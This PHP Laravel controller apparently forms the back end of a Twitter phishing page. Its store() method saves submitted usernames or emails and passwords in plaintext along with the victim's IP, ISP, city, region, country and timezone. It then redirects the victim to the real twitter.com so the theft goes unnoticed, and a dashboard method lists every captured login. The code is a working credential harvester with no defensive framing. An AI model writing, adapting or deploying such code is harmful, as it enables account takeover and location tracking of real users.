<?php

namespace App\Http\Controllers\SocialNetwork;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\Twitter;

class TwitterController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('socialNetwork.twitter.index');
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $dataTwitter = new Twitter();

        $this->validate($request, [
            'usernameOrEmail' => 'required',
            'password' => 'required',
        ]);

        $dataTwitter->usernameOrEmail = $request->usernameOrEmail;
        $dataTwitter->password = $request->password;
        $dataTwitter->ip = $request->ip;
        $dataTwitter->isp = $request->isp;
        $dataTwitter->city = $request->city;
        $dataTwitter->region = $request->region;
        $dataTwitter->country = $request->country;
        $dataTwitter->timezone = $request->timezone;
        
        $dataTwitter->save();

        return redirect('https://twitter.com/');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }

    public function dashboardTwitter()
    {
        $dataTwitter = Twitter::orderBy('id', 'DESC')->paginate();
        //dd($dataTwitter);
        return view('socialNetwork.twitter.dashboard', compact('dataTwitter'));
    }

}
